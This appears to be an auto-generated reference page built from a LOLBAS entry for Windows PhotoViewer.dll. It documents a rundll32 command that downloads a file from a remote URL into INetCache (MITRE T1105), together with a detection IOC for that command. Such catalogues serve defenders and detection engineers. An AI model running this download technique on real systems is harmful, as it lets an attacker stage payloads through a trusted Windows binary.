---
parsed_by: focuslocust
source: lolbas
type: generated
---
# PhotoViewer.dll

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `photoviewer.dll` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/PhotoViewer.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [PhotoViewer.dll](../../tools/windows/photoviewer.dll.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | photoviewer.dll |
| name | PhotoViewer.dll |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@avihayeldad'
  Person: Avihay Eldad
- Person: Tommy Warren
Author: Avihay Eldad
Commands:
- Category: Download
  Command: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
  Description: Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using
    the Windows Photo Viewer DLL.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from remote location.
Created: 2025-06-22
Description: Windows Photo Viewer
Detection:
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://') as an argument
Full_Path:
- Path: C:\Program Files\Windows Photo Viewer\PhotoViewer.dll
- Path: C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll
Name: PhotoViewer.dll
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/PhotoViewer.yml
```

## Detection / Analysis Notes

```text
IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://') as an argument
```

```text
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://') as an argument
```
